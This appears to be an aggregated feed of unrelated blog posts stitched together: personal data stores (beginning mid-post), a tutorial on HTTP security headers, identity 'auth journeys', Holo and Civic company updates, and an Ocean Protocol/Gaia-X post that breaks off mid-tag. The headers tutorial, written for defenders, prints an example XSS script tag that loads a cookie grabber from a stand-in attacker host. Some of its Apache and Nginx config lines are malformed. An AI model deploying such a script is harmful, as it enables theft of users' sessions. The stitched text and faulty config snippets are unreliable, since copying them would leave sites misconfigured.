<p>For services like these to work, people and the services they engage with need an interface. Traditionally, this interface has been provided by a single, isolated service provider via their website or app. But this requires individuals to sign in to each particular service and doesn’t enable dots to be joined between different providers. And if it’s an app, it creates a new dependency on Silicon Valley monopolists like Google and Apple with their app stores, while requiring that the individual has a smart&nbsp;device.</p><p>What’s more, the interface acts as a data suction device — sucking the user’s data into the systems of the app provider. In other words, the current approach is not only not inclusive, inefficient and restrictive, it is also privacy invading. Our answer: our web&nbsp;apps.</p><p>Web apps can be used on any device connected to the Internet, independently of the Silicon Valley monopolists’ app stores. Our architecture for web apps goes further, placing data that is generated in the individuals’ own personal data&nbsp;store.</p><p>And there is something else. With our Web Apps front line service providers (who know each step of a process inside out) can map each of these steps out, identifying exactly what information needs to be shared when, to create a seamless journey. We have developed the technology by which the resulting interface — the App itself — is generated without the front line service providers having to know anything about software or code. This means the people who really know what each service needs can quickly and easily generate interfaces with service users, as and when they need&nbsp;them.</p><p>With each Web App directly linked to the individual’s PDS, any information that needs to be shared (for example, a form needing to be completed) can be automatically sucked out of the PDS. This makes access to service modules like Smart Directories and Automated Form Filling instant and&nbsp;easy.</p> Citizen Co-design <p>For any service to be really useful, the most important input is that of the user — because users are the only people who really know what it feels like to use a&nbsp;service.</p><p>Every service module we develop — including all of the above — has been developed working with citizens who actually use the service. We have developed skills and processes to facilitate this and we are continuing to research how to best engage with citizens to really make their contributions easy, fulfilling, informative and actionable. This is part of the work we are doing on <a href="https://medium.com/mydex/supporting-citizen-participation-in-the-design-of-public-services-d3a56e6aa97">co-design of public services</a> discussed above.</p> Our Inclued&nbsp;platform <p>Many service providers don’t need just one of the above. They need them all — and more. They need channels to communicate and engage with citizens, to send and receive messages and to integrate that ability to act on these messages.</p><p>Working with Glasgow City Council we have built a platform, called <a href="https://mydex.org/platform-services/#inclued">Inclued</a>, which does all these things. Using Inclued, the Council can use the above capabilities to present citizens with incentives and offers, create communities, and seek feedback or direct engagement to gain insights and improve the targeting of their services. Inclued also eradicates form filling through secure, informed data sharing. Inclued is now being used as part of <a href="https://medium.com/mydex/supporting-citizen-participation-in-the-design-of-public-services-d3a56e6aa97">our work with the Scottish Government</a> and Connecting Scotland and our work with <a href="https://medium.com/mydex/revolutionising-healthy-ageing-200a7edd1016">Blackwood Homes and Care</a> as part of the three year programme with three local communities working on Healthy&nbsp;Ageing.</p> Consent Management Dashboards <p>For all of the above to work — for citizens to remain in control of their data and to have continued trust and confidence in what’s happening — they need quick, easy, simple ways to see which service provider has had access to what information, for what purposes. They need tools which enable them to make changes — such as withdrawing consent — when and if they want to; and to exercise their rights under data protection legislation if&nbsp;needed.</p><p>Currently this is practically impossible. Most of us have data sharing relationships with over 100 organisations (across health, financial services, public administration, education skills and employment, travel, retail, leisure, media and so on). Currently, to do anything relating to data with them, we have to jump through hoops, signing in to each different organisation’s website or app, navigating our way through to MyAccount, scrolling through Settings and so&nbsp;on.</p><p>The costs and hassle of doing this in a consistent way across 100 or more different relationships are so prohibitively high that hardly anyone bothers. What we have today is an entire data ecosystem and economy built on learned citizen helplessness — the realisation that exercising genuine control over your own data is such a vast, time consuming, hasslesome task that it’s not worth even&nbsp;trying.</p><p>We are changing that by building consent management dashboards that enable citizens to see and manage all their data relationships simply, quickly and easily from one place within their PDS. This includes the ability to create general permission and consent settings. What if, for example, instead of being confronted with a separate, different pop-up each time you visit a web site to set permissions for cookies, your PDS could instantly inform the web site that (for example) ‘I am happy with cookies for performance analytics but not for third party advertising).</p><p>Our consent management dashboard is still work in progress. There are still many bits of functionality that need to be built. But the core is there, working to support all of the above service&nbsp;modules.</p> Summary <p>Giving individuals the means to exercise control over their data — to be able to access and use their own data for their own purposes — is easy to say but hard to&nbsp;do.</p><p>Doing it in a way that also helps service providers benefit from citizen empowerment adds another level of challenge.</p><p>We’re not finished with this task by any means. But we have made a good start. Many core capabilities and functions are built and already adding value for both citizens and bona fide service providers. We’ve got many more in the pipeline.</p><p>The opportunity to unleash the full personal, social and economic potential of personal data is immense. And we are now on our&nbsp;way.</p><p>However, for all these services to be truly valuable they have to demonstrate built-in integrity. That’s the subject of our <a href="https://medium.com/mydex/designed-for-integrity-13a69bcda0b2">next&nbsp;blog</a>.</p> <p><a href="https://medium.com/mydex/flicking-the-switch-of-personal-data-4c5d0d368a31">FLICKING THE SWITCH OF PERSONAL DATA</a> was originally published in <a href="https://medium.com/mydex">Mydex</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

 The Security Headers 

<p>HTTP security headers are HTTP response headers designed to enhance the security of a site. They instruct browsers on how to behave and prevent them from executing vulnerabilities that would endanger your users.</p>

 HTTP Strict Transport Security (HSTS) 

<p>First, the Strict-Transport-Security header forces the browser to communicate with HTTPS instead of HTTP. HTTPS is the encrypted version of the HTTP protocol. Strictly using HTTPS can prevent most man-in-the-middle and session hijacking attacks.</p>

<p>This header has two configuration options: <code>max-age</code> and <code>includeSubDomains</code>. <code>max-age</code> is the number of seconds the browser should remember this setting. And if <code>includeSubDomains</code> is selected, the settings will apply to any subdomains of the site as well.</p>

   <code>Strict-Transport-Security: max-age=31536000 ; includeSubDomains
</code>   

<p>Ideally, this header should be set on all pages of the site to force browsers to use HTTPS.</p>

 Content-Security-Policy (CSP) 

<p>The Content-Security-Policy header controls which resource the browser is allowed to load for the page. For example, servers can restrict the scripts browsers use to a few trusted origins. This prevents some cross-site scripting attacks that load scripts from a malicious domain.</p>

   <code>&lt;script src="attacker.com/cookie_grabber.js"&gt;&lt;/script&gt;
</code>   

<p>There are many different directives of the policy, but the most important one is <code>script-src</code>, which defines where scripts can be loaded from. Other directives include <code>default-src</code>, <code>object-src</code>, <code>img-src</code>, and more. You can define a policy using the” header syntax:</p>

   <code>Content-Security-Policy: RESOURCE-TYPE ORIGIN ORIGIN ORIGIN ...
</code>   

<p>For example, this policy limits the source of scripts to the current domain, and “www.okta.com”. <code>self</code> represents the current domain.</p>

   <code>Content-Security-Policy: script-src 'self' https://www.okta.com
</code>   

<p>The <code>default-src</code> directive defines the policy for any resource that does not already have a policy. For example, this policy tells the browsers that all scripts should come from subdomains of “okta.com”, and all other resources should only load from the current domain.</p>

   <code>Content-Security-Policy: default-src 'self'; script-src https://*.okta.com
</code>   

 X-XSS-Protection 

<p>This header controls the XSS auditor on the user’s browser. There are four options for this header.</p>

   <code>X-XSS-Protection: 0 (Turns off XSS Auditor)
X-XSS-Protection: 1 (Turns on XSS Auditor)

X-XSS-Protection: 1; mode=block (Turns on XSS Auditor, prevents rendering the page when an attack is detected)

X-XSS-Protection: 1; report=REPORT_URI (Sanitizes the page and sends a report to the report URL when an attack is detected)
</code>   

<p>XSS auditors are built-in XSS filters implemented by some browsers. However, they are not a reliable way to protect your site against XSS attacks. Many browsers have removed their built-in XSS auditor because they can help attackers bypass XSS controls implemented by websites.</p>

<p>The current best practice is turning the XSS auditor off and implementing comprehensive XSS protection on the server side.</p>

   <code>X-XSS-Protection: 0
</code>   

 X-Frame-Options 

<p>The X-Frame-Options header prevents clickjacking attacks. Clickjacking is an attack in which attackers frame the victim site as a transparent layer on a malicious page to trick users into executing unwanted actions.</p>

<p>This header instructs the browser whether the page’s contents can be rendered in an iframe. There are three options: <code>DENY</code>, <code>SAMEORIGIN</code>, and <code>ALLOW-FROM</code>.</p>

   <code>X-Frame-Options: DENY (Page cannot be framed)

X-Frame-Options: SAMEORIGIN (Allow framing from pages of the same origin: same protocol, host, and port)

X-Frame-Options: ALLOW-FROM https://google.com (Allow framing from specified domain)
</code>   

<p>One of these options should be set on all pages that contain state-changing actions.</p>

 Referrer-Policy 

<p>The Referrer-Policy header tells the browser when to send Referrer information. This can help prevent information leakages offsite via Referrer URLs. There are many options for this header, the most useful ones being <code>no-referrer</code>, <code>origin</code>, <code>origin-when-cross-origin</code>, and <code>same-origin</code>. Note that “referrer” is not misspelled in this header like it is <a href="https://en.wikipedia.org/wiki/HTTP_referer">in HTTP’s “Referer”</a>!</p>

   <code>Referrer-Policy: no-referrer (Do not send referer)

Referrer-Policy: origin (Send the origin, no path or parameters)

Referrer-Policy: origin-when-cross-origin (Send the origin when the destination is offsite, otherwise, send entire referer)

Referrer-Policy: same-origin (Send referer when the destination is of the same origin, otherwise, send no referer)
</code>   

<p>You should consider using one of the above options as your Referrer-Policy header. They all protect against user info leaks in a referer path or parameter. In addition to setting the correct Referrer-Policy header, you should also avoid transporting sensitive information in URLs if possible.</p>

 X-Content-Type-Options 

<p>This header prevents MIME-sniffing. MIME-sniffing is when browsers try to determine the document’s file type by examining its content and disregarding the server’s instructions set in the Content-Type header.</p>

<p>MIME-sniffing is a useful feature but can lead to vulnerabilities. For example, an attacker can upload a JavaScript file with the extension of an image file. When others try to view the image, their browsers detect that the file is a JavaScript file and execute it instead of rendering it as an image. Setting this header to <code>nosniff</code> will prevent MIME-sniffing.</p>

   <code>X-Content-Type-Options: nosniff
</code>   

<p>Ideally, this header should be set for all content so that your website can decide how the browser renders files by setting the Content-Type response header. You could also use a separate subdomain to host user-uploaded content to prevent potential XSS attacks on the main domain.</p>

 Permissions-Policy 

<p>The Permissions-Policy header lets you enable and disable browser features. For example, you can control whether the current page and any pages it embeds have access to the user’s camera, microphone, and speaker. This allows developers to build sites that protect users’ privacy and security. The Permissions-Policy header looks like this.</p>

   <code>Permissions-Policy: FEATURE ORIGIN; FEATURE ORIGIN

Permissions-Policy: microphone=(), camera=()
There are three options for the allowed ORIGINs of each feature.
Permissions-Policy: microphone=(*) (Microphone will be allowed in this page and all framed pages)

Permissions-Policy: microphone=(self) (Microphone will be allowed in this page and all framed pages if same origin)

Permissions-Policy: microphone=() (Microphone will be disallowed in this page and all framed pages)
</code>   

<p>You can also specify the specific domain where the feature is allowed:</p>

   <code>Permissions-Policy: microphone=(self "https://example.com")
</code>   

<p>You can configure these directories according to your needs. It’s a good idea to place some control over the features that your iframes can access.</p>

 Configuring a Security Header 

<p>After you’ve determined which headers to use, you can configure your server to send them with HTTP responses.</p>

 Nginx 

<p>In Nginx, you can add a header by adding these lines to your site’s configuration.</p>

   <code>add_header X-Frame-Options SAMEORIGIN always;
add_header Content-Security-Policy "default-src 'self' https://*.okta.com";
add_header Permissions-Policy microphone=()
</code>   

 Apache 

<p>In Apache, the syntax is similar.</p>

   <code>Header always set X-Frame-Options "SAMEORIGIN"
Header set Content-Security-Policy "default-src 'self' https://*.okta.com";
Header always set "microphone 'none'; camera 'none'";
</code>   

 IIS 

<p>Finally, you can configure headers in IIS by adding custom headers to your site’s configuration file.</p>

   <code>&lt;configuration&gt;
   &lt;system.webServer&gt;
      &lt;httpProtocol&gt;
         &lt;customHeaders&gt;
            &lt;add name="X-Frame-Options" value="SAMEORIGIN" /&gt;
            &lt;add name="X-XSS-Protection" value="0" /&gt;
         &lt;/customHeaders&gt;
      &lt;/httpProtocol&gt;
   &lt;/system.webServer&gt;
&lt;/configuration&gt;
</code>   

 Firebase 

<p>Major cloud providers also give you options to customize the security headers you use. For instance, if you use Firebase, you can add security headers into the <code>firebase.json</code> file. Add a <code>headers</code> key to the JSON file with the security headers you want to add as its values:</p>

   <code>"headers": [
    { "key": "Permissions-Policy",
      "value": "microphone=(), camera=()"
    },
    {"key": "X-Frame-Options",
      "value": "DENY"
    }
]
</code>

<p>The 2020 pandemic and resulting work-from-home experience yielded an important conclusion regarding cybersecurity: identity is the new perimeter. Sixty-three percent of all data breaches exploit weak credentials, and incidents like SolarWinds highlight the need to focus cybersecurity on identity and access management (IAM) systems. Many organizations used the pandemic to accelerate their digital transformation projects with a focus on identity, but met additional challenges such as:</p>



<p>Bring-Your-Own-Device (BYOD): employees (new and existing), contractors, and freelancers require flexibility regarding the types of devices used and their capabilities to ensure proper identity verification, authentication, and credential storage.</p>



<p>Passwordless authentication: some devices are capable of securely storing credentials that can be used for proof-of-possession by an individual. This can be a convenience and productivity boost and reduce cybersecurity risks.</p>



<p>Biometrics: with new use cases for remote identity verification, and to further ensure proper identity binding to device-based credentials, biometrics can be combined with proof-of-possession to enable passwordless authentication.</p>



<p>Software-defined perimeters: in addition to or instead of virtual private networks (VPNs), multiple authentication flows can be combined to secure authorized access to specific resources within a perimeter. This can prevent data breaches, even in cases of VPN compromise (as in the SolarWinds attack), while enabling fine-grain audit for data protection compliance.</p>



<p>These challenges can make digital transformation a daunting challenge for many CISO and IT managers already under pressure to maintain their status quo password-based IAM systems. Luckily, the new concept of “auth journeys” lets them move beyond the limitations and complexities of existing AD and LDAP-based approaches. “Auth journeys” combine both authentication (authn) and authorization (authz) into processes defined at the user experience (UX) level instead of low-level auth protocols like OAuth, OIDC, SAML, etc.</p>



<p>An authentication journey is a workflow comprised of multiple steps in authentication and authorization processes available within an enterprise. Such steps include multi-factor authentication (MFA), biometrics, geolocation, PIN, credential checks, and even traditional methods (e.g., username &amp; password). Most IAM systems are never fully replaced but include old and new systems and are carefully migrated over rollout periods that last weeks or months. Journeys provide a mechanism to define rollouts, migrations, deprecated methods, upgrades, and credential recovery paths. Journeys are full lifecycle processes that include onboarding, offboarding and internal steps like Active Directory conditional access checks. IT departments can define minimal journeys for all users, specific roles, and then let users choose their own devices and options for MFA via self-service portals, which allows convenience for users. Some additional benefits of authentication journeys include:</p>



  Compliance &amp; auditing: KYC/AML laws vary globally, so journeys can be customized as remote onboarding becomes more widespread. Onboarding processes can be assessed at various IAL levels and resulting credentials tied to auth processes to directly link the IAL and AAL levels. If logging is part of the journey (as an internal step), auditing can be directly associated with both onboarding and auth processes.  



  Reduction in costs &amp; complexity: A wealth of powerful and effective authentication and authorization technologies are available in the market, but most are complex to manage from a system-level perspective. The security context is lost when dealing with sessions, roles, tokens, and other protocol-specific mechanisms at a low-level of process programming. By managing journeys as high-level definitions of authn and authz processes, CISOs can elevate management of access risks of associated resources above the machine-level programming of OIDC and JWT tokens used to implement such processes.  



  Better vulnerability management: explicit auditing, vulnerability analysis, threat modeling and accessibility enablement that actually improves security and reduces help desk password-reset costs. As in the cyber world, IAM vulnerabilities should be managed, shared and fixed at the journey level, not at the level of a specific protocol implementing a security policy incorrectly.  



  Credential-based onboarding and authorization: new verifiable credentials permit on-demand provisioning for new employees, contract and temporary freelancers who can present such trusted credentials upon signup instead of requiring out-of-band, a prior enrollment in AD/LAP registries. Such credentials, which have expiration dates and explicit privileges, can also encapsulate capabilities to be used in authorization flows.  



  FIDO: allows storage of encrypted credentials across many devices and modalities including security keys, biometrics, mobile phones, tablets, laptops and desktops with a password. FIDO allows developers to focus on high-level journeys in the IAM perimeter while providing device and security policy options.  



  Privacy, Accessibility, Inclusion and Diversity: Ultimately, such flexibility regarding authentication journeys allows each user to choose their own devices, biometric modalities, and credentials for access to specific resources within their enterprises. Such flexibility enables new paths that help protect user privacy, enable accessibility, and promote inclusion and diversity.  



<p>Journeys let users define their own authentication methods that comply with GRC (Governance, Risk &amp; Compliance) requirements while making choices explicit for IT managers. The IAM (Identity &amp; Access Management) landscape may seem to be getting more complex, but only because we’re trying to fit a square peg in a round hole. Old methods tied strictly to AD and LDAP registries with groups and their associated roles are only a narrow keyhole from the past into which we can view a broader IAM future. These systems will continue to be used in many enterprises but form only part of the many journeys available to users within the new IAM landscape.</p>

<p>It wasn’t long ago that the word ‘fungibility’ was but an obscure term understood only by economists and asset and commodity traders. Fewer even know that this peculiar word derives from the Latin verb fungi, meaning ‘to perform.’ From these arcane origins, the word is everywhere today, thanks to the meteoric rise to popularity of non-fungible tokens (NFTs), those little nuggets that can turn...</p>

 Lead/Org Update <p>You may have noticed an <a href="https://medium.com/h-o-l-o/monthly-roundup-for-holo-holochain-99a372802e2a">uptick</a> in stories, blogs, apps, news and announcements coming from Holo recently. In large part this is simply because there is much more that can be built on Holochain than ever before. The proof of this reality is that the wider community of projects and developers are beginning to move with haste in their respective projects. Simultaneously the Holo development team is now unblocked. Certain feature development had been on pause until Holochain had finished updating to a necessary level of features and stability. This is&nbsp;huge.</p><p>In order to make the sequencing of our interdependent work more visible to our community, we refreshed <a href="https://holo.host/roadmap/">our roadmap for Holo</a> and included some key Holochain releases.</p> Milestones Clarity Tied to Weekly&nbsp;Updates <p>We’ve renamed a few milestones for clarity but mostly we’ve included additional milestones to be able to more effectively tie our regular development updates to the milestones so that everyone can better understand where we&nbsp;are.</p><p>You will notice that we now have 9 of the Phase 3 milestones completed. An additional 7 of the milestones are what we call our work in progress, each of which is focused on by a specific sub-team. Every week, across the board, we are delivering features into test networks, usable builds for our community, and public releases.</p> Sharding Ready for Developers <p>In the past month the Holochain team released what we call the “Sharding Ready” release. If you are looking at it on Github, it is the release that is numbered 0.0.107. They have since delivered two additional releases that solidify and make those fundamental changes usable by community developers and by the Holo team. These releases of Holochain are precisely what the participants of the Dev Camp are using now for building, testing and deploying their own Holochain applications.</p> New Tools Make Rapid App Development Possible <p>Some amazing tools have also been made available on the tails of the Holochain release. The Launcher, our scaffolding tool, and the Dev Hub all make it easier for developers to adopt Holochain by saving them work and shortening their learning&nbsp;curve.</p><p>The Holochain Launcher is a dashboard that allows end users to install and run Holochain applications locally. This means that Holochain apps are easy to demo, easy to configure for testing by QA teams and community members — and ultimately easy for non-technical users to simply install and begin running on their own computers.</p><p>The scaffolding tool is the first in a set of Rapid Application Development tools — what’s known in the software world as RAD tools. The scaffolding tool provides a kickstart to the process of building an application. It allows new developers to lean on patterns that other more established Holochain developers have designed. It will also let non-developers who are members of product teams use business terms and logic for setting up the basics of an application. For example, if you are designing a blog, the scaffolding tool is where you would define concepts like a post and a list of&nbsp;posts.</p> Dev Campers Show RAD Tools&nbsp;Working <p>Session 3 of Dev Camp is where they introduced the RAD scaffolding tool to the participants and then assigned homework to participants to scaffold their first Holochain application. After that they will package the application and then run it from inside the Launcher.</p> DevHub Makes hApps Testable, Available to&nbsp;Devs <p>The DevHub is another tool that is being tested by a few of our community developers now. It’s a developer console where hApps are uploaded and tested, and where they will be reviewed/rated by other ecosystem developers. This component is critical to Holo in the sense that our Publisher Portal will look to it as the source for all Holochain applications that can be published to the Holo network for&nbsp;hosting.</p> Work in&nbsp;Progress <p>This week our team just finished getting all the various applications and services related to the Holo Platform updated to the Sharding Ready release of Holochain. This means that now Holo hApps and Infrastructure are working with a version of Holochain that exceeds all of our prior baseline performance metrics as compared to the previous releases of Elemental Chat.</p><p>There is so much underway — so we’ve added a small overlay to the roadmap that shows the following parts we are already working&nbsp;on.</p> Next Up: Elemental Chat Public Release (still just a Prototype) <p>Yes, with the performance gains with Holochain, we’re now preparing to let people use Elemental Chat on Holo. We’re working through testing and release processes now so stay tuned for announcements.</p> Publisher Portal &amp; HoloFuel Readying for Pre-Release Testing <p>The Holo team is steadily working on the first pre-release of the Publisher Portal as well as a release of the HoloFuel app with basic transactions of Test Fuel. Development on these two applications had paused previously because certain features required changes in Holochain that are now available with the recent Holochain update.</p> Holochain 0.1.x HDK&nbsp;Release <p>Holochain is preparing to do their first bump to a 0.1.x release. This indicates a greater level of usability and reliability. Our release numbering is based on the standard of <a href="https://semver.org/">Semantic Versioning</a>, where the first number is a major release, the second is a minor release and the third is a patch. Each time a project moves over one decimal in a startup project, it is a milestone worth celebrating as it typically indicates increased stability and documentation for the developers who are dependent on the&nbsp;project.</p> HoloPort Registration Useability <p>Another effort currenlty underway in the Holo team is the new key generation process for HoloPorts. This work will revise the current HoloPort Registration process, adding in critical steps for security as well as making the process more extensible for both our operations team and for the hosts who are registering. This will specifically set us up to build other features required for beta like multi-port registration and identity verification.</p> Wrapping it up with Community &amp; Customer&nbsp;Service <p>As we move forward today we are entering a period of increased complexity for our Community and Customer Support folks. For most of our Dev cycles up until now, we’ve had two sets of users — Hosts and Holochain developers. Others who follow the project have wanted to know what is possible with this new tech, what is available and how it works, and many others have wanted to better understand how it all relates to our token and eventually HoloFuel. This past month, however, saw us push forward to have multiple new tools and applications that are being used by many more developers and now also the end users of the applications those developers have&nbsp;built.</p><p>This means that non developers are asking more questions on our support channels and forums. This will only increase as we do pre-releases of HoloFuel and the Publisher Portal and as other projects make more and more Holochain apps available on the Launcher. We’re going to be working diligently with the community on ways to direct those questions to all the right&nbsp;places.</p><p>So thank you for all the interest and engagement — and a special thanks too for your patience as we stretch and evolve through these wonderful growing&nbsp;pains.</p><p>-Mary</p> <p><a href="https://medium.com/h-o-l-o/q4-2021-update-on-milestones-and-progress-27eb0b0b7e5a">Q4 2021: Update on Milestones and Progress</a> was originally published in <a href="https://medium.com/h-o-l-o">HOLO</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

<p>During the third quarter, the entire crypto space was abuzz, and Civic was no exception. The quarter was marked by strong performances, especially from Bitcoin, which is the best <a href="https://finance.yahoo.com/news/bitcoin-q3-performance-cements-status-173555550.html">performing asset</a> this year, beating both stocks and commodities. NFT investment also <a href="https://www.reuters.com/technology/nft-sales-surge-107-bln-q3-crypto-asset-frenzy-hits-new-highs-2021-10-04/">reached new heights</a> as a flood of sales reached $10.7B during the quarter. And, FATF, the regulatory entity that sets global standards for cryptocurrency, <a href="https://www.fatf-gafi.org/publications/fatfrecommendations/documents/second-12-month-review-virtual-assets-vasps.html">issued its 12-month review</a> of revised standards on virtual assets, clearing the way for countries to codify and enforce new standards.</p>



<p>Key Milestones</p>



<p>Civic has always been ahead of the curve when it comes to decentralization and identity verification. As signals from regulators became stronger over the summer, we understood quickly from our clients and prospective clients that new permissioning tools for DeFi were needed to respond to these dynamic compliance requirements. We accommodated by building a DeFi product, called <a href="https://www.civic.com/solutions/civic-pass/">Civic Pass</a>.</p>



<p>In September, we <a href="https://www.civic.com/blog/solrise-civic-first-permissioned-dex-on-solana/">partnered with Solrise Finance</a> to announce the first on-chain decentralized exchange on Solana, Solrise DEX Pro, with permissioned access based on digital identity. Civic provides a KYC solution, through Civic Pass, that a dApp provider can use as an input to their compliance program. Solrise DEX Pro uses Civic Pass to determine which participants meet their rigorous standards for verification prior to allowing them the ability to trade. From Solrise DEX Pro, users are guided to use Civic’s identity verification technology solution. Once the user has completed the Civic Pass screening process, Solrise DEX Pro uses the results of the screening to allow trades on the DEX. The underlying technology for this product comes from Identity.com.</p>



<p>During the third quarter, we also <a href="https://www.civic.com/blog/black-fire-innovation-age-verification-vending-machine/">partnered with Black Fire Innovation</a>, the hospitality technology hub created by Caesars Entertainment, Inc., and the University of Nevada, Las Vegas (UNLV), to launch a vending machine demo using Age Verification by Civic. The technology is based on Identity.com’s open source identity verification ecosystem and is strategically located where advanced gaming and hospitality technology are developed.</p>



<p>The summer heralded new hires and promotions as the company repositioned itself for growth. Most importantly, our co-founder Vinny Lingham moved into a new role as Chairman of the Board at Civic, and <a href="https://www.civic.com/blog/new-board-member-maja-vujinovic/">promoted Civic’s new CEO</a>, Chris Hart, from his position as COO, a role he held for three years. We also <a href="https://www.civic.com/blog/new-board-member-maja-vujinovic/">gained a new board member</a>, Maja Vujinovic, who previously led blockchain as a CIO at GE, and has already made a tremendous strategic impact on our company’s direction. We also added a director of risk and compliance to our team, Chis Harding, who has already <a href="https://cointelegraph.com/news/defi-regulation-must-not-kill-the-values-behind-decentralization">penned an op-ed in Cointelegraph</a>.</p>



<p>Civic in the News</p>



<p>Civic gained its share of media attention over the summer with a total online readership of 332M. Our new CEO, Chris Hart, shared thoughts on the identity verification industry at the <a href="https://www.youtube.com/watch?v=Nq7aJtoDr1c">ReImagine Conference</a>, on the <a href="https://www.youtube.com/watch?v=qgTXz7pYMIM">Crypto Coin Show</a>, and on <a href="https://www.securities.io/chris-hart-chief-operating-officer-at-civic-interview-series/">Securities.io</a>, while our previous CEO, Vinny Lingham, shared insight with <a href="https://www.theinformation.com/articles/the-don-t-kill-crypto-billboard-the-rise-of-crypto-compliance-startups">The Information</a>. Our new head of risk and compliance, Chris Harding also introduced himself to <a href="https://medium.com/authority-magazine/the-future-is-now-christopher-harding-of-civic-technologies-on-how-their-technological-innovation-7397ef2a9a64">Authority Magazine</a>.</p>



<p>Our partnership with Black Fire Innovation garnered unique features in <a href="https://www.vendingtimes.com/articles/age-verification-taps-blockchain-to-protect-privacy-for-self-service/">Vending Times</a>, <a href="https://thespoon.tech/civic-technologies-powers-age-verification-tech-in-new-vending-machine/">The Spoon</a> and <a href="https://www.biometricupdate.com/202108/biometric-booze-vending-machine-verifies-buyers-age-but-only-if-they-have-the-app">Biometric Update</a>, and our press release reached 83M+ viewers. Additionally, our partnership with Solrise Finance received 14 pieces of unique coverage, including a piece in <a href="https://www.coindesk.com/business/2021/09/23/why-civic-is-building-defi-identity-tools-on-solana/">CoinDesk</a>, <a href="https://coinmarketcap.com/headlines/news/Solrise-and-Civic-Launch-First-Permissioned-DEX-on-Solana/">CoinMarketCap</a>, <a href="https://u.today/first-ever-solanas-permissioned-dex-unveiled-by-solrise-finance-and-civic-technologies-details">U.Today</a>, <a href="https://invezz.com/news/2021/09/23/civic-technologies-and-solrise-finance-introduce-first-on-chain-dex-on-solana/">Invezz</a> and other publications. The press release reached a total potential audience of 77M.</p>



<p>Coming Soon</p>



<p>With the strong performance of NFTs this summer and into the fall, we’ve expanded our <a href="https://www.civic.com/solutions/civic-pass-for-nfts/">Civic Pass offering to NFTs</a>, so you can expect to hear more announcements on that front. We’re also working hard to make Civic Pass available across chains and will be sharing more news about partnerships on that front. Finally, we’ll be paying close attention to upcoming regulations that affect our clients and responding to their needs to make our products better.</p>

 Building towards a decentralized European Data Economy: A Minimal Viable Gaia-X (MVG) powered by Ocean&nbsp;Protocol <p>Representatives from business, science, and politics on a European level are creating a proposal of a European data infrastructure for the next generation: a secure, federated system that meets the highest standards of digital sovereignty and promotes innovation. Gaia-X is the cradle of an open, transparent, decentralized digital ecosystem, where data and services can be made available, collated, shared, and monetized in an environment of trust. <a href="https://www.gaia-x.eu/members">More than 300 organizations</a> and over 2500 contributors are already supporting Gaia-X.</p><p>Private data can help with the research and development of life-altering innovations in both science and technology. The more data available — from a multitude of sources, the more accurate the predictions of Artificial Intelligence (AI) models&nbsp;become.</p><p>However, companies still hesitate to share and sell their private data, as it has traditionally had unpredictable risks, such as data breaches and related liability. This is one reason why data often remains locked, because of concerns over security, privacy, and trust. Thus, even today, data silos are exploited by only a few companies, which results in an inaccessible and intransparent data&nbsp;market.</p><p>Gaia-X tries to solve these problems and shows that data sharing and monetization are possible without sacrificing data sovereignty, data protection, privacy, and European values. Ocean Protocol offers a technical solution to these problems in that it enables creating open, transparent, and decentralized data&nbsp;markets.</p><p>As data has the potential to become the single most valuable asset of our time, Gaia-X will significantly contribute to the economic welfare of all Europeans in the coming&nbsp;decades.</p><p>“​​Ocean Protocol is working with Gaia-X to help deliver goals for the development of an efficient, competitive, secure and trustworthy federation of data infrastructure and service providers for Europe.” — Trent McConaghy, Ocean Protocol&nbsp;founder.</p><p>“Together with industry-leading collaborators, we continue jointly innovating and engineering a European cloud infrastructure.” — Frederic Schwill, Tech Lead at deltaDAO&nbsp;AG.</p><p>Ocean Protocol provides core functionalities for the Gaia-X federated services leading to a Minimal Viable Gaia-X (MVG) available today. It enables services to interact with each other and be used like lego bricks to build new and more complex products.</p> Using Open Source Distributed Ledger Technology to build a European Data&nbsp;Economy <p>The very first Gaia-X Hackathon took place in August 2021. More than 250 participants from over 25 countries worked on different components of a Minimal Viable Gaia-X, sponsored by Ocean Protocol, deltaDAO, <a href="https://blog.oceanprotocol.com/ocean-datarella-and-the-future-of-mobility-data-sovereignty-with-gaia-x-95bdf8f89cc4">Datarella</a>, Google Cloud, and&nbsp;more.</p><p>deltaDAO AG co-organized the Hackathon, led the “Compute-to-Data” stream, and presented a Minimal Viable Gaia-X Demonstrator based on Ocean Protocol.</p><p>The Minimal Viable Gaia-X <a href="https://portal.minimal-gaia-x.eu/">Demonstrator</a> built by deltaDAO on top of Ocean/using Ocean tech stack is a Web3 interpretation of the Gaia-X Federation Services and Registry. deltaDAO demonstrated that Ocean Protocol provides most Gaia-X core functionality today, enabling a decentralized data economy in line with the Gaia-X&nbsp;vision.</p><p>Gaia-X Test&nbsp;Network</p><p>Ocean Protocol is blockchain agnostic. Hence, it works with any EVM-compatible Distributed Ledger. deltaDAO deployed a few additional components on the Gaia-X Test Network in preparation for the Hackathon, enabling Ocean Protocol to be seamlessly used within the Gaia-X ecosystem. If you want to try it, get your OCEAN test tokens&nbsp;<a href="https://faucet.gaiaxtestnet.oceanprotocol.com/">here</a>.</p><p>Gaia-X Portal powered by Ocean Protocol: A platform to find, publish and consume Data Services in the Gaia-X Test&nbsp;Network.</p><p><a href="https://portal.minimal-gaia-x.eu/">https://portal.minimal-gaia-x.eu/</a> |</p><p>GitHub: <a href="https://github.com/deltaDAO/Ocean-Market">https://github.com/deltaDAO/Ocean-Market</a></p><p>The Gaia-X Portal, developed by deltaDAO, is built on Ocean Protocol, as a trustless, decentralized, and privacy-preserving data and AI-sharing and monetization protocol. It connects data publishers and consumers, listing data services in the Gaia-X network. The Portal is fully open-source and you can try it&nbsp;<a href="https://github.com/deltaDAO/Ocean-Market">here</a>.</p><p>Any company or institution can adopt data portals. While fully customizable, all portals connect to the Gaia-X Test Network, enabling interoperability and cross-listing of Data Services by&nbsp;design.</p><p>Onboarding videos and tutorials</p><p>As most Hackathon participants were new to Web3, deltaDAO assembled an interactive onboarding tutorial. Try it yourself&nbsp;<a href="https://portal.minimal-gaia-x.eu/tutorial">here</a>.</p><p><a href="https://catalogue.minimal-gaia-x.eu/">Gaia-X Catalogue</a>: A tool to find Data Service Self-Descriptions in the Gaia-X Test&nbsp;Network.</p><p>deltaDAO’s Web3 interpretation of a Gaia-X Catalogue demonstrates a “Catalogue of Catalogues” based on Distributed Ledger Technology (DLT). It lists all data service self-descriptions in the Gaia-X Test network, offering an immutable ground truth to all network participants.</p><p>Self-Description Lifecycle Management</p><p>The Gaia-X Architecture document defines a lifecycle for all data self-descriptions. deltaDAO built a <a 